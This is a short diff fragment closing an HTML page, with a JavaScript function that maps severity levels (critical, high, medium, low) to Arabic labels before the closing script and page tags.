+                'critical': 'حرج', 'high': 'عالي', 'medium': 'متوسط', 'low': 'منخفض'
+            };
+            return severityMap[severity] || severity;
+        }
+    </script>
+</body>
+</html>
